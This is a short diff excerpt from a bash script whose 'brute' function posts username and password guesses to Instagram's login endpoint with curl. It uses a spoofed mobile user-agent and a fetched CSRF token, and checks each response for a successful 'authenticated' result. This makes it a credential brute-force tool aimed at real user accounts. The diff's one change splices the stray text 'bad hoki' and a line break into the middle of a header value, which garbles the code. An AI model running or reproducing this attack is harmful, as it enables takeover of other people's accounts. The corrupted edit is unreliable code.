@@ -103,7 +103,8 @@ function brute(){
                     -H "referer: https://www.instagram.com/accounts/login/" \
                     -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
                     -H "x-csrftoken: ${token}" \
-                    -H "x-requested-with: XMLHttpRequest" \
+                    -H "x-requested-with: XMLHttpRequebad hoki
+st" \
                     -d "username=${i}&password=${pass}")
                     login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
                     if [[ $login =~ "true" ]]; then
